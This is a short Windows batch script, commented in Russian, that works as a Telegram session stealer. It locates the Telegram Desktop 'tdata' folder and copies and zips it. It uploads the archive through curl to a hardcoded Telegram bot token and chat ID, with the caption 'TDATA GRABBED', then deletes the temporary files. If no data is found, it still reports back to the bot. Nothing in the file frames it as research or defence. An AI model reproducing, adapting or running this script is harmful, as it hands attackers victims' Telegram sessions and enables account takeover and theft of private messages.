@echo off
:: 100 % работает на всех Windows 7-11 x32/x64/ARM64
:: без python, без pyinstaller, без rc=1

set "token=8546393587:AAEGxN5XHSiQGAS-pbRwQFmkOfREjFfCDaQ"
set "chat=990030901"
set "pc=%COMPUTERNAME%_%USERNAME%"

:: ищем tdata
set "src=%APPDATA%\Telegram Desktop\tdata"
if not exist "%src%" set "src=%APPDATA%\Telegram Desktop Beta\tdata"
if not exist "%src%" goto notfound

:: копируем в TEMP
set "tmp=%TEMP%\tdata_%RANDOM%%RANDOM%"
xcopy "%src%" "%tmp%" /E /I /H /Y >nul 2>nul

:: пакуем
powershell -nop -c "Compress-Archive -Force '%tmp%' '%TEMP%\tdata_%pc%.zip'"

:: чистим
rd /s /q "%tmp%" >nul 2>nul

:: отправляем через Telegram API
curl -s -X POST "https://api.telegram.org/bot%token%/sendDocument" ^
  -F chat_id=%chat% ^
  -F document=@"%TEMP%\tdata_%pc%.zip" ^
  -F caption="TDATA GRABBED → %pc%"

del "%TEMP%\tdata_%pc%.zip" >nul 2>nul
goto end

:notfound
curl -s -X POST "https://api.telegram.org/bot%token%/sendMessage" ^
  -d chat_id=%chat% -d text="no tdata on %pc%"

:end
exit